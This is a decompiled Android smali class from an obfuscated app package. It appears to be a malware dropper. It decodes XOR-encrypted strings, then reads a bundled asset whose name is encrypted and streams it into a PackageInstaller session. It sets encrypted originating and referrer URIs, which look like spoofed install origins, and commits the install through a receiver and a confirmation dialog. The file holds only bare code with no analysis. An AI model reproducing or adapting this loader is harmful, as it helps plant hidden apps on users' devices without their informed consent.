.class public abstract Lconfimanag/scanutil/alfagamma/transper/i5;
.super Ljava/lang/Object;
.source "SourceFile"


# static fields
.field private static final a:Ljava/lang/String;

.field public static final b:Ljava/lang/String;

.field private static c:Landroid/content/pm/PackageInstaller;

.field private static d:Landroid/os/HandlerThread;

.field private static e:Landroid/os/Handler;


# direct methods
.method static constructor <clinit>()V
    .locals 3

    .line 1
    const/16 v0, 0x13

    new-array v0, v0, [B

    fill-array-data v0, :array_0

    const/16 v1, 0x8

    new-array v2, v1, [B

    fill-array-data v2, :array_1

    invoke-static {v0, v2}, Lconfimanag/scanutil/alfagamma/transper/p5;->a([B[B)Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lconfimanag/scanutil/alfagamma/transper/i5;->a:Ljava/lang/String;

    const/16 v0, 0xa

    new-array v0, v0, [B

    fill-array-data v0, :array_2

    new-array v2, v1, [B

    fill-array-data v2, :array_3

    invoke-static {v0, v2}, Lconfimanag/scanutil/alfagamma/transper/p5;->a([B[B)Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lconfimanag/scanutil/alfagamma/transper/i5;->b:Ljava/lang/String;

    new-instance v0, Landroid/os/HandlerThread;

    const/16 v2, 0x14

    new-array v2, v2, [B

    fill-array-data v2, :array_4

    new-array v1, v1, [B

    fill-array-data v1, :array_5

    invoke-static {v2, v1}, Lconfimanag/scanutil/alfagamma/transper/p5;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-direct {v0, v1}, Landroid/os/HandlerThread;-><init>(Ljava/lang/String;)V

    sput-object v0, Lconfimanag/scanutil/alfagamma/transper/i5;->d:Landroid/os/HandlerThread;

    return-void

    :array_0
    .array-data 1
        0x36t
        0x32t
        0x3ft
        -0x8t
        -0x22t
        -0x40t
        0x5dt
        -0x5t
        0x21t
        0x34t
        0x3et
        -0x10t
        -0x18t
        -0x25t
        0x5et
        -0x12t
        0x30t
        0x33t
        0x25t
    .end array-data

    :array_1
    .array-data 1
        0x55t
        0x5dt
        0x51t
        -0x62t
        -0x49t
        -0x4et
        0x30t
        -0x66t
    .end array-data

    :array_2
    .array-data 1
        0x64t
        0x2et
        -0x78t
        0x6ct
        -0x1et
        0x7ct
        -0x1ft
        -0xet
        0x7et
        0x2ft
    .end array-data

    nop

    :array_3
    .array-data 1
        0x17t
        0x4bt
        -0x5t
        0x1ft
        -0x75t
        0x13t
        -0x71t
        -0x53t
    .end array-data

    :array_4
    .array-data 1
        -0x5at
        0x55t
        -0x6at
        -0x51t
        -0x24t
        -0x1bt
        0x41t
        -0x37t
        -0x59t
        0x5bt
        -0x70t
        -0x75t
        -0x27t
        -0x60t
        0x65t
        -0x2bt
        -0x7at
        0x51t
        -0x64t
        -0x57t
    .end array-data

    :array_5
    .array-data 1
        -0xct
        0x3at
        -0x7t
        -0x25t
        -0x50t
        -0x80t
        0x32t
        -0x46t
    .end array-data
.end method

.method public static a(Ljava/io/InputStream;Ljava/io/OutputStream;)V
    .locals 3

    .line 1
    const/high16 v0, 0x100000

    new-array v0, v0, [B

    :goto_0
    invoke-virtual {p0, v0}, Ljava/io/InputStream;->read([B)I

    move-result v1

    if-lez v1, :cond_0

    const/4 v2, 0x0

    invoke-virtual {p1, v0, v2, v1}, Ljava/io/OutputStream;->write([BII)V

    goto :goto_0

    :cond_0
    return-void
.end method

.method public static b(Landroid/content/Context;)V
    .locals 14

    .line 1
    const/16 v0, 0xa

    new-array v1, v0, [B

    fill-array-data v1, :array_0

    const/16 v2, 0x8

    new-array v3, v2, [B

    fill-array-data v3, :array_1

    invoke-static {v1, v3}, Lconfimanag/scanutil/alfagamma/transper/p5;->a([B[B)Ljava/lang/String;

    const/4 v1, 0x0

    :try_start_0
    sget-object v3, Lconfimanag/scanutil/alfagamma/transper/i5;->d:Landroid/os/HandlerThread;

    invoke-virtual {v3}, Ljava/lang/Thread;->isAlive()Z

    move-result v3

    if-nez v3, :cond_0

    sget-object v3, Lconfimanag/scanutil/alfagamma/transper/i5;->d:Landroid/os/HandlerThread;

    invoke-virtual {v3}, Ljava/lang/Thread;->start()V

    goto :goto_0

    :catchall_0
    move-exception p0

    goto/16 :goto_9

    :catch_0
    move-exception p0

    goto/16 :goto_7

    :cond_0
    :goto_0
    new-instance v3, Landroid/os/Handler;

    sget-object v4, Lconfimanag/scanutil/alfagamma/transper/i5;->d:Landroid/os/HandlerThread;

    invoke-virtual {v4}, Landroid/os/HandlerThread;->getLooper()Landroid/os/Looper;

    move-result-object v4

    invoke-direct {v3, v4}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    sput-object v3, Lconfimanag/scanutil/alfagamma/transper/i5;->e:Landroid/os/Handler;

    invoke-virtual {p0}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v3

    invoke-virtual {v3}, Landroid/content/pm/PackageManager;->getPackageInstaller()Landroid/content/pm/PackageInstaller;

    move-result-object v3

    sput-object v3, Lconfimanag/scanutil/alfagamma/transper/i5;->c:Landroid/content/pm/PackageInstaller;

    new-instance v3, Landroid/content/pm/PackageInstaller$SessionParams;

    const/4 v4, 0x1

    invoke-direct {v3, v4}, Landroid/content/pm/PackageInstaller$SessionParams;-><init>(I)V

    const/4 v5, 0x0

    invoke-virtual {v3, v5}, Landroid/content/pm/PackageInstaller$SessionParams;->setInstallLocation(I)V

    const/16 v6, 0x18

    new-array v7, v6, [B

    fill-array-data v7, :array_2

    new-array v8, v2, [B

    fill-array-data v8, :array_3

    invoke-static {v7, v8}, Lconfimanag/scanutil/alfagamma/transper/p5;->a([B[B)Ljava/lang/String;

    move-result-object v7

    invoke-static {v7}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v7

    invoke-virtual {v3, v7}, Landroid/content/pm/PackageInstaller$SessionParams;->setOriginatingUri(Landroid/net/Uri;)V

    new-array v7, v6, [B

    fill-array-data v7, :array_4

    new-array v8, v2, [B

    fill-array-data v8, :array_5

    invoke-static {v7, v8}, Lconfimanag/scanutil/alfagamma/transper/p5;->a([B[B)Ljava/lang/String;

    move-result-object v7

    invoke-static {v7}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v7

    invoke-virtual {v3, v7}, Landroid/content/pm/PackageInstaller$SessionParams;->setReferrerUri(Landroid/net/Uri;)V

    sget v7, Landroid/os/Build$VERSION;->SDK_INT:I

    if-lt v7, v6, :cond_1

    invoke-static {v3, v4}, Lconfimanag/scanutil/alfagamma/transper/b5;->a(Landroid/content/pm/PackageInstaller$SessionParams;I)V

    :cond_1
    invoke-virtual {v3, v1}, Landroid/content/pm/PackageInstaller$SessionParams;->setAppPackageName(Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    const/16 v6, 0x1f

    if-lt v7, v6, :cond_2

    :try_start_1
    invoke-static {v3, v4}, Lconfimanag/scanutil/alfagamma/transper/c5;->a(Landroid/content/pm/PackageInstaller$SessionParams;I)V

    :cond_2
    const/16 v8, 0x22

    if-lt v7, v8, :cond_3

    invoke-static {v3, v1}, Lconfimanag/scanutil/alfagamma/transper/d5;->a(Landroid/content/pm/PackageInstaller$SessionParams;Ljava/lang/String;)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    :catch_1
    :cond_3
    :try_start_2
    sget v7, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v8, 0x1e

    if-lt v7, v8, :cond_4

    invoke-static {v3, v5}, Lconfimanag/scanutil/alfagamma/transper/e5;->a(Landroid/content/pm/PackageInstaller$SessionParams;Z)V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_2
    .catchall {:try_start_2 .. :try_end_2} :catchall_0

    :catch_2
    :cond_4
    const/4 v7, 0x2

    :try_start_3
    sget v8, Landroid/os/Build$VERSION;->SDK_INT:I

    if-lt v8, v6, :cond_5

    invoke-static {v3, v7}, Lconfimanag/scanutil/alfagamma/transper/f5;->a(Landroid/content/pm/PackageInstaller$SessionParams;I)V
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_3
    .catchall {:try_start_3 .. :try_end_3} :catchall_0

    :catch_3
    :cond_5
    :try_start_4
    sget v8, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v9, 0x21

    if-lt v8, v9, :cond_6

    invoke-static {v3, v7}, Lconfimanag/scanutil/alfagamma/transper/g5;->a(Landroid/content/pm/PackageInstaller$SessionParams;I)V
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_4
    .catchall {:try_start_4 .. :try_end_4} :catchall_0

    :catch_4
    :cond_6
    :try_start_5
    sget v8, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v9, 0x1a

    if-lt v8, v9, :cond_7

    invoke-static {v3, v7}, Lconfimanag/scanutil/alfagamma/transper/h5;->a(Landroid/content/pm/PackageInstaller$SessionParams;I)V
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_5
    .catchall {:try_start_5 .. :try_end_5} :catchall_0

    :catch_5
    :cond_7
    :try_start_6
    sget-object v7, Lconfimanag/scanutil/alfagamma/transper/i5;->c:Landroid/content/pm/PackageInstaller;

    invoke-virtual {v7, v3}, Landroid/content/pm/PackageInstaller;->createSession(Landroid/content/pm/PackageInstaller$SessionParams;)I

    move-result v3

    sget-object v7, Lconfimanag/scanutil/alfagamma/transper/i5;->c:Landroid/content/pm/PackageInstaller;

    invoke-virtual {v7, v3}, Landroid/content/pm/PackageInstaller;->openSession(I)Landroid/content/pm/PackageInstaller$Session;

    move-result-object v1

    invoke-virtual {p0}, Landroid/content/Context;->getAssets()Landroid/content/res/AssetManager;

    move-result-object v3

    new-array v0, v0, [B

    fill-array-data v0, :array_6

    new-array v7, v2, [B

    fill-array-data v7, :array_7

    invoke-static {v0, v7}, Lconfimanag/scanutil/alfagamma/transper/p5;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v3, v0}, Landroid/content/res/AssetManager;->open(Ljava/lang/String;)Ljava/io/InputStream;

    move-result-object v0
    :try_end_6
    .catch Ljava/lang/Exception; {:try_start_6 .. :try_end_6} :catch_0
    .catchall {:try_start_6 .. :try_end_6} :catchall_0

    const/4 v3, 0x6

    :try_start_7
    new-array v3, v3, [B

    fill-array-data v3, :array_8

    new-array v7, v2, [B

    fill-array-data v7, :array_9

    invoke-static {v3, v7}, Lconfimanag/scanutil/alfagamma/transper/p5;->a([B[B)Ljava/lang/String;

    move-result-object v3

    new-array v4, v4, [Ljava/lang/Object;

    invoke-static {v5}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v7

    aput-object v7, v4, v5

    invoke-static {v3, v4}, Ljava/lang/String;->format(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v9

    const-wide/16 v10, 0x0

    invoke-virtual {v0}, Ljava/io/InputStream;->available()I

    move-result v3

    int-to-long v12, v3

    move-object v8, v1

    invoke-virtual/range {v8 .. v13}, Landroid/content/pm/PackageInstaller$Session;->openWrite(Ljava/lang/String;JJ)Ljava/io/OutputStream;

    move-result-object v3
    :try_end_7
    .catchall {:try_start_7 .. :try_end_7} :catchall_1

    :try_start_8
    invoke-static {v0, v3}, Lconfimanag/scanutil/alfagamma/transper/i5;->a(Ljava/io/InputStream;Ljava/io/OutputStream;)V

    invoke-virtual {v1, v3}, Landroid/content/pm/PackageInstaller$Session;->fsync(Ljava/io/OutputStream;)V
    :try_end_8
    .catchall {:try_start_8 .. :try_end_8} :catchall_2

    if-eqz v3, :cond_8

    :try_start_9
    invoke-virtual {v3}, Ljava/io/OutputStream;->close()V
    :try_end_9
    .catchall {:try_start_9 .. :try_end_9} :catchall_1

    goto :goto_1

    :catchall_1
    move-exception p0

    goto :goto_5

    :cond_8
    :goto_1
    :try_start_a
    invoke-virtual {v0}, Ljava/io/InputStream;->close()V

    new-instance v0, Landroid/content/Intent;

    const-class v3, Lcom/appd/instll/BroReceiver;

    invoke-direct {v0, p0, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const/16 v3, 0x17

    new-array v3, v3, [B

    fill-array-data v3, :array_a

    new-array v2, v2, [B

    fill-array-data v2, :array_b

    invoke-static {v3, v2}, Lconfimanag/scanutil/alfagamma/transper/p5;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v2}, Landroid/content/Intent;->setAction(Ljava/lang/String;)Landroid/content/Intent;

    sget v2, Landroid/os/Build$VERSION;->SDK_INT:I

    if-lt v2, v6, :cond_9

    const/high16 v2, 0xa000000

    goto :goto_2

    :cond_9
    const/high16 v2, 0x8000000

    :goto_2
    invoke-static {p0, v5, v0, v2}, Landroid/app/PendingIntent;->getBroadcast(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object p0

    invoke-virtual {p0}, Landroid/app/PendingIntent;->getIntentSender()Landroid/content/IntentSender;

    move-result-object p0

    invoke-virtual {v1, p0}, Landroid/content/pm/PackageInstaller$Session;->commit(Landroid/content/IntentSender;)V
    :try_end_a
    .catch Ljava/lang/Exception; {:try_start_a .. :try_end_a} :catch_0
    .catchall {:try_start_a .. :try_end_a} :catchall_0

    :goto_3
    invoke-virtual {v1}, Landroid/content/pm/PackageInstaller$Session;->close()V

    goto :goto_8

    :catchall_2
    move-exception p0

    if-eqz v3, :cond_a

    :try_start_b
    invoke-virtual {v3}, Ljava/io/OutputStream;->close()V
    :try_end_b
    .catchall {:try_start_b .. :try_end_b} :catchall_3

    goto :goto_4

    :catchall_3
    move-exception v2

    :try_start_c
    invoke-virtual {p0, v2}, Ljava/lang/Throwable;->addSuppressed(Ljava/lang/Throwable;)V

    :cond_a
    :goto_4
    throw p0
    :try_end_c
    .catchall {:try_start_c .. :try_end_c} :catchall_1

    :goto_5
    if-eqz v0, :cond_b

    :try_start_d
    invoke-virtual {v0}, Ljava/io/InputStream;->close()V
    :try_end_d
    .catchall {:try_start_d .. :try_end_d} :catchall_4

    goto :goto_6

    :catchall_4
    move-exception v0

    :try_start_e
    invoke-virtual {p0, v0}, Ljava/lang/Throwable;->addSuppressed(Ljava/lang/Throwable;)V

    :cond_b
    :goto_6
    throw p0
    :try_end_e
    .catch Ljava/lang/Exception; {:try_start_e .. :try_end_e} :catch_0
    .catchall {:try_start_e .. :try_end_e} :catchall_0

    :goto_7
    :try_start_f
    invoke-virtual {p0}, Ljava/lang/Throwable;->printStackTrace()V

    if-eqz v1, :cond_c

    invoke-virtual {v1}, Landroid/content/pm/PackageInstaller$Session;->abandon()V
    :try_end_f
    .catchall {:try_start_f .. :try_end_f} :catchall_0

    :cond_c
    if-eqz v1, :cond_d

    goto :goto_3

    :cond_d
    :goto_8
    return-void

    :goto_9
    if-eqz v1, :cond_e

    invoke-virtual {v1}, Landroid/content/pm/PackageInstaller$Session;->close()V

    :cond_e
    throw p0

    nop

    :array_0
    .array-data 1
        -0xft
        -0x57t
        -0x5ft
        0x5t
        -0x78t
        -0x57t
        0x23t
        -0x6ft
        -0xct
        -0x4et
    .end array-data

    nop

    :array_1
    .array-data 1
        -0x7ct
        -0x27t
        -0x3bt
        0x64t
        -0x4t
        -0x34t
        0xdt
        -0x10t
    .end array-data

    :array_2
    .array-data 1
        -0x5dt
        0xbt
        0x7et
        -0x2at
        -0x3ct
        0x3dt
        0x2ft
        -0x68t
        -0x45t
        0x13t
        0x6bt
        -0x21t
        -0x67t
        0x60t
        0x6ft
        -0x28t
        -0x54t
        0x13t
        0x6ft
        -0x78t
        -0x2ct
        0x68t
        0x6dt
        -0x68t
    .end array-data

    :array_3
    .array-data 1
        -0x35t
        0x7ft
        0xat
        -0x5at
        -0x49t
        0x7t
        0x0t
        -0x49t
    .end array-data

    :array_4
    .array-data 1
        -0x5at
        -0x18t
        -0x40t
        0xct
        -0x5ft
        0x20t
        0x2ct
        0x16t
        -0x42t
        -0x10t
        -0x2bt
        0x5t
        -0x4t
        0x7dt
        0x6ct
        0x56t
        -0x57t
        -0x10t
        -0x2ft
        0x52t
        -0x4ft
        0x75t
        0x6et
        0x16t
    .end array-data

    :array_5
    .array-data 1
        -0x32t
        -0x64t
        -0x4ct
        0x7ct
        -0x2et
        0x1at
        0x3t
        0x39t
    .end array-data

    :array_6
    .array-data 1
        -0x6t
        -0x54t
        0x7et
        0x68t
        -0x4et
        0x20t
        -0x4bt
        0x9t
        -0x1t
        -0x49t
    .end array-data

    nop

    :array_7
    .array-data 1
        -0x71t
        -0x24t
        0x1at
        0x9t
        -0x3at
        0x45t
        -0x65t
        0x68t
    .end array-data

    :array_8
    .array-data 1
        0xbt
        0x54t
        -0x56t
        -0x53t
        0x36t
        -0x61t
    .end array-data

    nop

    :array_9
    .array-data 1
        0x2et
        0x30t
        -0x7ct
        -0x34t
        0x46t
        -0xct
        0x51t
        -0x74t
    .end array-data

    :array_a
    .array-data 1
        0x43t
        -0x36t
        -0x28t
        -0x59t
        -0x4at
        0x73t
        0xbt
        -0x1bt
        0x47t
        -0x3bt
        -0x3bt
        -0x48t
        -0x44t
        0x6ft
        0xbt
        -0xft
        0x4bt
        -0x2at
        -0x37t
        -0x48t
        -0x44t
        0x73t
        0x0t
    .end array-data

    :array_b
    .array-data 1
        0x2t
        -0x77t
        -0x74t
        -0x12t
        -0x7t
        0x3dt
        0x54t
        -0x5ft
    .end array-data
.end method

.method public static c(Landroid/content/Context;ILandroid/content/Intent;)V
    .locals 2

    .line 1
    new-instance v0, Landroid/content/Intent;

    const-class v1, Lcom/appd/instll/ConfirmDialog;

    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    sget-object v1, Lconfimanag/scanutil/alfagamma/transper/i5;->a:Ljava/lang/String;

    invoke-virtual {v0, v1, p2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Landroid/os/Parcelable;)Landroid/content/Intent;

    sget-object p2, Lconfimanag/scanutil/alfagamma/transper/i5;->b:Ljava/lang/String;

    invoke-virtual {v0, p2, p1}, Landroid/content/Intent;->putExtra(Ljava/lang/String;I)Landroid/content/Intent;

    const/high16 p1, 0x10000000

    invoke-virtual {v0, p1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {p0, v0}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    return-void
.end method
